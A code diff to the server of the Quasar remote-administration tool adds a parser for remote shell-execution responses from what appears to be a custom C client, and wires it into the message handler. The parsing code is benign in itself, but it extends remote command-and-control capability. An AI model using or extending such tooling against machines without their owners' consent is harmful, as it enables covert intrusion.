@@ -595,6 +595,35 @@ namespace Quasar.Server.Networking
             return true;
         }
 
+        /* Fallback: C client DoShellExecuteResponse (subtype 24) = 08 18 + field 1 Output (string), 2 IsError (varint). */
+        private static bool TryParseRawDoShellExecuteResponse(byte[] payload, int start, int length, out DoShellExecuteResponse result)
+        {
+            result = null;
+            int end = start + length;
+            if (!TryReadIMessagePrefix(payload, start, end, out int subtype, out int offset)) return false;
+            if (subtype != 24) return false;
+            string output = "";
+            bool isError = false;
+            while (offset < end)
+            {
+                if (!TryReadVarint(payload, ref offset, end, out int tag)) break;
+                int field = tag >> 3;
+                int wire = tag & 7;
+                if (wire == 0)
+                {
+                    if (!TryReadVarint(payload, ref offset, end, out int v)) break;
+                    if (field == 2) isError = (v != 0);
+                    continue;
+                }
+                if (wire != 2) break;
+                if (!TryReadVarint(payload, ref offset, end, out int len) || offset + len > end) break;
+                if (field == 1) output = Encoding.UTF8.GetString(payload, offset, len);
+                offset += len;
+            }
+            result = new DoShellExecuteResponse { Output = output ?? "", IsError = isError };
+            return true;
+        }
+
         /// <summary>
         /// Checks whether the clients are equal.
         /// </summary>
@@ -986,6 +1015,10 @@ namespace Quasar.Server.Networking
                                         else if (TryParseRawFileTransferComplete(_payloadBuffer, payloadStart, _payloadLen, out var rawComplete))
                                         {
                                             message = rawComplete;
+                                        }
+                                        else if (TryParseRawDoShellExecuteResponse(_payloadBuffer, payloadStart, _payloadLen, out var rawShellResp))
+                                        {
+                                            message = rawShellResp;
                                         }
                                         else
                                         {
